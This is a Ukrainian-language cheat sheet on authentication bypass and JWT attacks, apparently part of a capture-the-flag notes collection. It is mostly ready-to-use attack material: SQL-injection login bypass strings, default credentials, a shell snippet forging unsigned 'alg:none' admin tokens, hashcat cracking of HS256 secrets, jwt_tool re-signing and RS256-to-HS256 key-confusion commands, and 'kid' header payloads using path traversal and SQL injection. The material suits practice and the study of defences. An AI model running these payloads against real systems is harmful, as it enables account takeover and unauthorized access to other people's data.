# Cheatsheet: Auth Bypass & JWT

Обхід автентифікації/авторизації й атаки на JWT-токени → доступ до адмінки, чужих даних, прапорців.
Місця: login-форми, cookie/`Authorization: Bearer`, `role`/`isAdmin` у токені, скидання пароля.
← [web-enum](../02-workflows/web-enum.md) · [web-vulns](../04-techniques/web-vulns-overview.md) · SQLi-логін: [sqlmap-sqli](sqlmap-sqli.md)

## 1. Швидкі обходи логіну (перед важким)
```
admin' -- -            # SQLi auth bypass (→ sqlmap-sqli.md)
admin' #
default creds          # admin:admin, admin:password, root:root, перевірити README/docs додатка
```
- **Перевірити реєстрацію:** створити свого юзера → подивитись структуру cookie/токена.
- **Логіка «запам'ятати»/reset:** токен скидання у відповіді/лозі; `?user=admin` у формі reset.

## 2. JWT — структура і перший огляд
Токен = `base64url(header).base64url(payload).signature`. Декодувати без крипти:
```bash
jwt=eyJ...; for p in 1 2; do echo "$jwt" | cut -d. -f$p | tr '_-' '/+' | base64 -d 2>/dev/null; echo; done
```
Дивитись `alg`, `kid` у header та `user`/`role`/`admin`/`exp` у payload. Інструмент: `hashcat`, онлайн-аналог офлайн — `jwt_tool`.

## 3. alg:none (підпис не перевіряється)
Якщо сервер приймає `alg:none` — прибрати підпис і правити payload вільно:
```bash
h='{"alg":"none","typ":"JWT"}'; p='{"user":"admin","role":"admin"}'
b64() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }
echo "$(b64 "$h").$(b64 "$p")."        # крапка в кінці, підпис порожній
```
Варіанти регістру для обходу чорного списку: `None`, `nOnE`, `NONE`.

## 4. Слабкий секрет HS256 (брут офлайн)
Брут ЛОКАЛЬНО по токену (не по платформі — брут платформи заборонений):
```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt   # jwt.txt = цілий токен
```
Знайдено секрет → перепідписати з потрібним payload:
```bash
jwt_tool "$jwt" -S hs256 -p 'secret' -T    # -T правити claims інтерактивно
```
Часті секрети CTF: `secret`, `key`, `jwt`, `changeme`, назва додатка.

## 5. alg confusion RS256 → HS256
Сервер чекає RS256, але перевіряє HS256 → підписати HMAC-ом, де ключ = публічний RSA-ключ сервера:
```bash
# public key інколи на /jwks.json, /.well-known/jwks.json, /publickey.pem або з TLS-сертифіката
jwt_tool "$jwt" -X k -pk public.pem -T      # key-confusion attack
```

## 6. kid injection (header `kid`)
`kid` підставляється у шлях/запит → path traversal або SQLi:
```
"kid":"../../../../dev/null"      # ключ = порожньо → підписати порожнім HMAC
"kid":"/etc/passwd"               # відомий вміст як ключ (рідко)
"kid":"key' UNION SELECT 'secret'-- -"   # kid іде в SQL → керований ключ
```

## 7. Логіка авторизації (після автентифікації)
- Змінити `id`/`user` у токені чи запиті на чужий → [IDOR](../04-techniques/web-vulns-overview.md#idor).
- Додати `"role":"admin"`/`"isAdmin":true`, якщо підпис обійдено.
- `exp` у минулому відкидається → оновити час при перепідписанні.

## Пастки / куди далі
- Спершу дешеве: default creds і `alg:none`, лише потім брут секрету.
- Правка payload без валідного підпису → сервер поверне 401/500: підпис таки перевіряється → йти в п.4-6.
- Доступ до адмінки/чужих даних → flag-hunt у відповідях і далі [web-enum](../02-workflows/web-enum.md); знайдені креди → [credentials-reuse](../04-techniques/credentials-reuse.md).
